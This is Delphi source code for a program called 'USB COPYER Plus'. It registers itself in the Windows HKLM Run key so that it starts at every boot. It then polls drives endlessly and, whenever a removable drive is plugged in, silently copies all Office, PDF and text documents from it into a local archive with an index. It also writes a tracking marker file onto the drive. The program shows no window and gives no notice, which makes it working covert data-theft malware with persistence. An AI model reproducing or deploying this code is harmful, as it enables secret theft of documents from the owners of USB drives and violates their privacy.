//USB COPYER Plus Version
//Compiled on July 3rd,2012
//Bug Fixed on July 20th,2012
//Bug Fixed on Oct 28th,2012
//Designer:Grant Liu
unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,strutils,registry;

type
  TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
const
  delaytime=500;

type
  //General Structure
  strtype=string[252];
  datestr=string[12]; //11!

  info=packed record   //520!!
    datatype:strtype;  //FILE OR DIR*
     dest:strtype;
    readsize:int64;

  end;
  pinfo=^info;

  queueinfo=packed record
    datatype:strtype;
    path:strtype;
    dest:strtype;
  end;

 pqueueinfo=^queueinfo;
var
  avail:boolean;
  saver:tfilestream;
  queuehandle,queueid:cardinal;
  indfile:textfile;
  usbid2:strtype;
  x2:datestr;
  root:string;


procedure closequeue(x,usbid:datestr);
var
  filename:string;
begin
  postthreadmessage(queueid,0,0,4444);
  waitforsingleobject(queuehandle,infinite);
  closefile(indfile);
  filename:=usbid+'_'+x+'.CF';
  //saver.SaveToFile(filename);
  freeandnil(saver);
  avail:=true;
end;

procedure queue;
var
  msg1:msg;
  ptmpqueueinfo:pqueueinfo;
  tmpinfo:info;
  exiter:boolean;

function getsize(path:strtype):int64;
var
  tmpstream:tfilestream;
begin
  try
  tmpstream:=tfilestream.Create(path,fmopenread);
  tmpstream.Position:=0;
  result:=tmpstream.Size;
  freeandnil(tmpstream);
  except
    //closequeue(x2,usbid2);
  end;
end;

procedure savefile(path:strtype);
var
 tmpstream:tfilestream;
begin
  try
  tmpstream:=tfilestream.create(path,fmopenread);
  tmpstream.Position:=0;
 // tmpstream.SaveToStream(saver);
  saver.CopyFrom(tmpstream,0);
  freeandnil(tmpstream);
  except
   // closequeue(x2,usbid2);
 end;

end;

begin
  exiter:=false;
  repeat
    if getmessage(msg1,0,0,0) then
      begin
      if msg1.lparam=8888 then
        begin
         ptmpqueueinfo:=pqueueinfo(msg1.wparam);
          with ptmpqueueinfo^ do
            begin
              tmpinfo.datatype:=datatype;
              if datatype='FILE' then
                begin
                  tmpinfo.readsize:=getsize(path);
                  tmpinfo.dest:=dest;
                  //saver.WriteBuffer(tmpinfo,sizeof(tmpinfo));
                  writeln(indfile,tmpinfo.datatype);  //type
                  writeln(indfile,saver.Position);    //pos
                  writeln(indfile,tmpinfo.readsize);  //size
                  writeln(indfile,tmpinfo.dest);      //dest
                  savefile(path);
                end;
              if datatype='DIR*' then
                begin
                  tmpinfo.readsize:=sizeof(path);
                  tmpinfo.dest:=dest;
                 // saver.WriteBuffer(tmpinfo,sizeof(tmpinfo));
                  writeln(indfile,tmpinfo.datatype);  //type
                  writeln(indfile,tmpinfo.dest);      //dest
               end;
            end;

          dispose(ptmpqueueinfo);
       end;
      if msg1.lparam=4444 then exiter:=true;
    end;
  until exiter=true;
end;

procedure addtoque(path:strtype;datatype:strtype;dest:strtype);
var
  tmp:pqueueinfo;
begin
  new(tmp);
  tmp^.path:=path;
  tmp^.datatype:=datatype;
  tmp^.dest:=dest;
  postthreadmessage(queueid,0,longint(tmp),8888);

end;


procedure copyer(source,dest:strtype);
var
  flag:integer;
  folder:tsearchrec;

function isthatone(filepath:strtype):boolean;           //tell whether it is a needed one
var
  x:strtype;
begin
  x:=extractfileext(filepath);
  //'doc','docx','xls','xlsx','ppt','pptx','txt'
  if ((x='.doc') or (x='.docx') or (x='.xls') or (x='.xlsx') or (x='.ppt') or (x='.pptx') or (x='.txt') or (x='.pdf') or (x='.pps') or (x='.ppsx')) then
    result:=true
  else
    result:=false;
end;

begin

  flag:=findfirst(source+'*.*',faanyfile,folder);
  while flag=0 do
    begin
      if Folder.Attr and FaDirectory <> FaDirectory then
        begin
         //This is a file
         //Add to queue
         if isthatone(source+folder.name) then addtoque(source+folder.name,'FILE',dest+folder.name);
         Flag:= FindNext(Folder);
        end
   else
     begin
       if (Folder.Name <> '.') and (not AnsiContainsText(Folder.Name,'..'))
  then begin
       //This is a directory
       //Add to queue
       addtoque(source+folder.name+'\','DIR*',dest+folder.name+'\');
       Copyer(source+Folder.Name + '\',dest+folder.name+'\');
       flag:= FindNext(Folder);
       end
  else flag:=FindNext(Folder);
 end;
 end; //while
end;

procedure openqueue(x,usbid:datestr);
begin
  root:=extractfilepath(paramstr(0))+formatdatetime('yyyy-mm-dd',now);
  forcedirectories(pchar(root));
  avail:=false;
  saver:=tfilestream.Create(root+'\'+usbid+'_'+x+'.CF',fmcreate);
  //saver.writebuffer(x,sizeof(x));
  //saver.writebuffer(usbid,sizeof(usbid));
  assign(indfile,root+'\'+usbid+'_'+x+'.index');
  rewrite(indfile);
  writeln(indfile,usbid);
  writeln(indfile,x);
  queuehandle:=createthread(nil,0,@queue,nil,0,queueid);
end;

//核心！！！！！！！！！！！！！
procedure core;
var
  typenum:integer;
  i:char;
  disk:string;
  errormode:word;
  x:datestr;
  usbid:strtype;

function GenerateUsbId:string;
var
  i:integer;
  ID:string;
begin
  randomize;
  ID:='#';
  for i:=1 to 6 do
    ID:=ID+chr(trunc(random(26))+65);
  result:=ID;
end;

function GetDiskInfo(disk:string):string;
var
 f:textfile;
 x:string;
begin
  assign(f,disk+'CF');
  reset(f);
  readln(f,x);
  readln(f,x);
  closefile(f);
  result:=x;
end;

function copyed(disk:strtype):string;
var
  s,savedtime:string;
  f:textfile;
  usbid:strtype;
begin
  s:=formatdatetime('yyyy-mm-dd',now);
  result:='';

  if fileexists(disk+'CF')=false then
   begin
     assign(f,disk+'CF');
     rewrite(f);
     writeln(f,s);
     usbid:=GenerateUsbId;
     writeln(f,usbid);
     close(f);
     result:=s;
    end
   else
     begin
       assign(f,disk+'CF');
       reset(f);
       readln(f,savedtime);
       readln(f,usbid);
       close(f);
       if savedtime<>s then begin result:=s;assign(f,disk+'CF');rewrite(f);writeln(f,s);writeln(f,usbid);close(f);end;
    end;
end;

begin
  EConvertError.Create('Not a valid drive ID');
  ErrorMode :=SetErrorMode(SEM_FailCriticalErrors);
  avail:=true;
repeat
   for i:='C' to 'Z' do
      begin
        disk:=i+':\';

        if DiskSize(Ord(I) - $40) <> -1 then
          begin
            typenum:=getdrivetype(pchar(disk));
           if (typenum=DRIVE_REMOVABLE) and (avail=true)  then
             begin
               x:=copyed(disk);
               x2:=x;
               if x<>'' then begin
             //磁盘初始设置
              //打开队列线程
              usbid:=getdiskinfo(disk);
              usbid2:=usbid;
              openqueue(x,usbid);
              //直接存入一个流

              copyer(disk,'\');
              //关闭队列线程
              closequeue(x,usbid);
              end;
             end;
             end;
        end;

  sleep(delaytime);
  until 1=2;
end;

procedure addtostartup(exename,savepath:string);
var
  Reg:TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  Try
    RootKey := HKEY_LOCAL_MACHINE;
      if OpenKey('SOFTWARE\MicroSoft\Windows\CurrentVersion\Run',false) then
        Reg.WriteString(exename,savepath);
  finally
    Reg.Free;
  end;
end;

procedure programinit;
begin
  addtostartup(application.exename,application.exename);
end;
procedure TForm1.FormCreate(Sender: TObject);

begin
  programinit;
  core;
end;

end.
